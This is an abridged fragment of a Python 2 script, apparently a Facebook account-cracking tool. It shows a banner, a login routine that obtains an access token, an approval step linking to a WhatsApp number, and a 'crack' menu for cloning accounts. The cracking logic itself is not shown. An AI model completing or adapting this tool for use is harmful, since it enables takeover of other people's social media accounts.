...
logo = """
                       ...
                       ____  _____ _     _  _       _  __ _  _      _____
/  _ \/  __// \ |\/ \/ \     / |/ // \/ \  /|/  __/
| | \||  \  | | //| || |     |   / | || |\ ||| |  _
| |_/||  /_ | \// | || |_/\  |   \ | || | \||| |_//
\____/\____\\__/  \_/\____/  \_|\_\\_/\_/  \|\____\  
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: AhMed Shah
\033[1;92mFb \033[1;93m:  Ahmed Shah X.X.X
\033[1;92mDisclaimer \033[1;93m: Its For JusT For Fun
\033[0m----------------------------------
...
def main():
 ...
 os.system('clear')
	...
	print("")
	try:
		tok = open('/sdcard/Download/.ahm.', 'r').read()
...
def not_reg():
    ...
    v_Token_token_save = open('/sdcard/Download/Approval.txt', 'w')
    ...
    print("")
    raw_input("  \t  \033[1;93m Press enter to check again ")
    os.system('xdg-open https://wa.me/+9231835824') #whatsapp number here
    Token_token()
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100016638918434')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100016638918434/UCv3xnTA7veQe64UYUwDybEg')
        main()
    else:
        print ''
...
def login():
    try:
        ...
        print logo
        print ''
        print ' \x1b[1;91m  \tFacebook se login Menu'
        print ''
...
def log_fb():
    ...
    try:
        ...
        if 'access_token' in q:
            ...
            print ''
            print '\tToken Cp hay Ja k Check kar'
            print ''
            time.sleep(1)
            login()
        else:
            print ''
            print '\tYa phiR Pass Check kar'
            print ''
            time.sleep(1)
...
def crack():
    ...
    print logo
    print ''
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks Syed Ahmed 
    print ''
    crack_select()
